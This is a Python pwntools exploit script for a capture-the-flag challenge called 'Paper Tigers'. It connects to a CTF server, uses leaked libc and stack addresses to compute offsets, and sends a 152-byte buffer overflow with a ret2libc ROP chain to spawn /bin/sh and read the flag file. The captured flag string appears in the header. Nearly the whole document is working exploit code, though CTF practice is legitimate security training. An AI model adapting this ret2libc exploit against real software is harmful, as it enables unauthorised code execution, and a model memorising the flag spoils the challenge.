#!/usr/bin/env python3
"""
Paper Tigers - Final Exploit
Author: CTF Solver
Created: 2025-11-15
Updated: 2025-11-15 - Successful exploitation
Purpose: Exploit buffer overflow with ret2libc
Assumptions:
  - Buffer at RBP-144 (0x90) based on GDB disassembly
  - 128 byte buffer + 16 byte gap + 8 byte saved RBP = 152 byte offset to return address
  - Stack alignment gadget needed for system() on x64
Expected result: Shell access and flag from /flag/flag.txt
Produced result: SUCCESS - Flag captured: poctf{uwsp_7h15_fl46_15_n07_4_clu3}
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'exp100-1.pointeroverflowctf.com'
PORT = 14660

# Load libc
libc = ELF('./libc_remote.so.6', checksec=False)

# Offsets
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh'))

# Gadgets
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

log.info("Exploiting with correct offset (152 bytes)...")

# Connect
p = remote(HOST, PORT)

# Get leaks
p.recvuntil(b'legacy debug prints follow:\n')
libc_leak = int(p.recvline().strip(), 16)
stack_leak = int(p.recvline().strip(), 16)

log.success(f"Leaked puts@libc: 0x{libc_leak:x}")
log.success(f"Leaked stack:     0x{stack_leak:x}")

# Calculate
libc_base = libc_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
pop_rdi_addr = libc_base + pop_rdi
ret_addr = libc_base + ret_gadget

log.success(f"Libc base: 0x{libc_base:x}")

# Wait for prompt
p.recvuntil(b'Send your payload:\n')

# Build payload with CORRECT offset
payload = b'A' * 152          # Fill to return address (not 136!)
payload += p64(ret_addr)      # Stack alignment
payload += p64(pop_rdi_addr)  # pop rdi; ret
payload += p64(binsh_addr)    # /bin/sh
payload += p64(system_addr)   # system()

log.info(f"Sending {len(payload)}-byte payload...")
p.send(payload)

# Try to get output
sleep(0.5)
p.send(b'cat /flag/flag.txt\n')
p.send(b'echo "===DONE==="\n')

try:
    output = p.recvall(timeout=2)
    decoded = output.decode('latin-1', errors='ignore')

    print("\n" + "="*60)
    print("OUTPUT:")
    print("="*60)
    print(decoded)
    print("="*60 + "\n")

    if 'poctf{' in decoded.lower() or '===DONE===' in decoded:
        log.success("SUCCESS!")
        for line in decoded.split('\n'):
            if 'poctf{' in line.lower():
                log.success(f"FLAG: {line}")
    else:
        log.warning("No shell or flag detected")

except Exception as e:
    log.error(f"Error: {e}")

p.close()
